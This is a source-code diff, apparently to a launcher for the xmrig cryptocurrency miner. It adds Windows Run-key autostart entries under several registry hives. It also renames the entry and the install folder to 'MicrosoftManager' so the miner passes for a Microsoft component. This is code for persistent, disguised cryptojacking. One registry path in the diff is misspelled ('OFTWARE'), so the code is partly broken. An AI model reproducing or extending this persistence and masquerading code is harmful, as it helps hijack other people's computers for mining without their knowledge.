@@ -54,20 +54,31 @@ BOOL IsElevated() {
 int AutoRun(TCHAR* path, BOOL Admin) {
 	HKEY hKey = NULL;
 	HKEY hKey2 = NULL;
+	HKEY hKey3 = NULL;
 	DWORD dwRegType = REG_SZ;
 	LONG lResult = 0;
 	if (Admin) {
-		lResult = RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey2);
+		lResult = RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey2);
 		if (ERROR_SUCCESS != lResult) {
-			RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey2);
+			RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey2);
+			RegCreateKey(HKEY_LOCAL_MACHINE, L"OFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey3);
 		}
-		RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey2);
-		RegSetValueExW(hKey2, L"NameRegister", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
+		RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey2);
+		RegSetValueExW(hKey2, L"MicrosoftManager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
 		RegCloseKey(hKey2);
+		RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey3);
+		RegSetValueExW(hKey3, L"MicrosoftManager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
+		RegCloseKey(hKey3);
 	} else {
 		RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
-		RegSetValueExW(hKey, L"NameRegister", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
+		RegSetValueExW(hKey, L"MicrosoftManager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
 		RegCloseKey(hKey);
+		RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey2);
+		RegSetValueExW(hKey2, L"MicrosoftManager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
+		RegCloseKey(hKey2);
+		RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey3);
+		RegSetValueExW(hKey3, L"MicrosoftManager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
+		RegCloseKey(hKey3);
 	}
 
 	return 0;
@@ -83,7 +94,7 @@ char* WorkerID() {
 }
 
 int main(int argc, char **argv) {
-	AutoRun(L"C:\xmrig\xmrigDaemon.exe", IsElevated());
+	AutoRun(L"C:\\MicrosoftManager\\xmrigDaemon.exe", IsElevated());
     App* app = new App(argc, argv);
     int res = app->start();
     delete app;
